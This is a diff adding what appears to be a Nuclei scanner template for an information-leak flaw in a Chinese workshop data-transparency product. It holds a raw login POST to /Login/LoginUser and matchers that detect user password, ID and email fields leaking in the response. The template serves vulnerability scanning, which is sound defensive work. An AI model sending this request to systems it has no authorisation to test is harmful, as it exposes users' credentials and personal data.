@@ -1,0 +1,28 @@
+id: poc-yaml-business-management-system-info-leak
+info:
+  name: 车间数据透明化软件LoginUser存在信息泄露漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: 信息泄露
+
+http:
+  - raw:
+      - |
+        POST /Login/LoginUser HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        X-Requested-With: XMLHttpRequest
+
+        {"RecordID":"admin","password":"11111","undefined":"登录","language":"zh-CN"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"PASSQORD\""
+          - "\"USERNO\""
+          - "\"EMAIL\""
+          - "\"USERID\""
+        part: body
